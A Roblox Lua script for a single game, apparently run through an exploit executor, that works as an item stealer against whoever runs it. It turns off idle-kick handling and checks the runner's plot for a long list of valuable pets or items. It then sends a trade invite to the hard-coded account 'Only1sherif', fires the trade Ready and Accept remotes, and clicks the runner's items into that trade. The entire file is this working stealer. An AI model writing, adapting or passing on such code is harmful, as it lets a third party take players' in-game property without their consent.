if game.PlaceId ~= 109983668079237 then return end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

local TARGET_NAME = "Only1sherif"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

for i, v in pairs(getconnections(plr.Idled)) do
    if v.Disable then v:Disable() end
end

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
    return nil
end

local readyRE = getRemote("RE/TradeService/Ready")
local acceptRE = getRemote("RE/TradeService/Accept")

local function scanPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    
    local myPlot = nil
    local myName = plr.Name:lower()
    local myDisplayName = plr.DisplayName:lower()

    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local label = sign:FindFirstChildOfClass("TextLabel", true)
            if label then
                local t = label.Text:lower()
                if t:find(myName) or t:find(myDisplayName) then
                    myPlot = p
                    break
                end
            end
        end
    end

    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                local itemName = child.Name:lower()
                for _, wanted in ipairs(wantedItems) do
                    if itemName == wanted:lower() or itemName:find("^" .. wanted:lower()) then
                        return true
                    end
                end
            end
        end
    end
    return false
end

local function sendInvite()
    local tl = plr.PlayerGui:FindFirstChild("TradePlayerList")
    if tl and tl:FindFirstChild("TradePlayerList") then
        local inner = tl.TradePlayerList
        local sb = inner.bg.SearchFrame.SearchBox
        
        sb.Text = TARGET_NAME
        task.wait(0.3)
        pcall(function() firesignal(sb.FocusLost, true) end)
        task.wait(0.5)
        
        for _, p in pairs(inner.Global.List:GetChildren()) do
            if p:IsA("Frame") and p:FindFirstChild("Fill") then
                local nameLbl = p.Fill:FindFirstChild("Username")
                if nameLbl and nameLbl.Text:lower():find(TARGET_NAME:lower()) then
                    local send = p.Fill:FindFirstChild("Send")
                    if send and send.Visible then
                        pcall(function() firesignal(send.Activated) end)
                        return true
                    end
                end
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled then
                local inner = tradeUI.TradeLiveTrade
                
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.2)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                if inner.Other.Username.Text:lower():find(TARGET_NAME:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") then
                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                        firesignal(spacer.Activated)
                                    end
                                end
                            end
                        end
                    end
                end
            else
                if scanPlot() then
                    sendInvite()
                    task.wait(5)
                end
            end
        end)
        task.wait(2)
    end
end)
